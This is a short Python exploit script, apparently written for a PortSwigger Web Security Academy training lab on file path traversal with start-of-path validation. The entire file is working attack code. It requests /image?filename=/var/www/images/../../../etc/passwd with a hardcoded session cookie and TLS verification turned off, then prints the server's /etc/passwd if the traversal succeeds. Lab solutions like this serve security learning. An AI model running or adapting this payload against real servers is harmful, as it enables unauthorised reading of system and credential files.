#!/usr/bin/python3
#Author: 0xtonyr
#GitHub: https://github.com/0xtonyr/
#Exploit to PortSwigger Academy Path Traversal Lab #5
#Lab: File path traversal, validation of start of path

import requests
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print(f"[-]Usage: {sys.argv[0]} target-url")
        sys.exit(1)

    session = requests.session()
    target = sys.argv[1].rstrip("/")
    payload = "/image?filename=/var/www/images/../../../etc/passwd"

    url = target + payload 
    cookies = {"session": "zwz07iGLgVgH9IJ9LxrFIPpBpNvBrmIJ"}
    headers = {"Sec-Ch-Ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a5600ee03c2236b81bc3a82000e0067.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"}
    
    try:
        response = session.get(url, headers=headers, cookies=cookies, verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        if "root:x:0:0:root:/root:/bin/bash" in response.text:
            print("[+]Path Traversal successfully exploited! Retrieving /etc/passwd file:")
            print()
            print(soup.prettify())
        
    except requests.exceptions.HTTPError as errh:
        print("Http Error:", errh)
    except requests.exceptions.ConnectionError as errc:
        print("Error Connecting:", errc)
    except requests.exceptions.Timeout as errt:
        print("Timeout Error:", errt)
    except requests.exceptions.RequestException as err:
        print("Oops: Something Else", err)


if __name__ == "__main__":
    main()

